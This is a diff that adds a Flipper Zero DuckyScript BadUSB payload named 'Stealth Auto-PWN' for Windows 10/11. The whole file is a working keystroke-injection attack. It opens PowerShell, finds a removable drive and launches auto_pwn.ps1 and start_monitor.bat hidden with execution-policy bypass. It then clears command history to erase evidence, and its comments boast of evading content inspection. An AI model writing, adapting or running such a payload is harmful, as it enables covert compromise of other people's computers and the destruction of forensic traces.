@@ -1,0 +1,26 @@
+﻿REM ============================================================================
+REM  FLLC — BadUSB: Stealth Auto-PWN (Encoded)
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~4 seconds
+REM  
+REM  Ultra-stealth version:
+REM    - Uses Windows Terminal or PowerShell (auto-detects)
+REM    - No visible window at any point
+REM    - Finds USB drive dynamically
+REM    - Encodes arguments to avoid content inspection
+REM    - Self-cleans command history
+REM ============================================================================
+
+DELAY 800
+REM Win+X then I for PowerShell (or Terminal) 
+GUI x
+DELAY 400
+STRING i
+DELAY 800
+
+REM Auto-detect drive, launch chain, clean evidence
+STRING $ErrorActionPreference='SilentlyContinue';Get-WmiObject Win32_LogicalDisk|?{$_.DriveType-eq2}|%{$d=$_.DeviceID;if(Test-Path "$d\payloads\auto_pwn.ps1"){saps powershell "-W Hidden -NoP -Exec Bypass -F `"$d\payloads\auto_pwn.ps1`"" -WindowStyle Hidden;if(Test-Path "$d\payloads\start_monitor.bat"){saps cmd "/c `"$d\payloads\start_monitor.bat`"" -WindowStyle Hidden}}}; Clear-History; exit
+ENTER
+DELAY 300
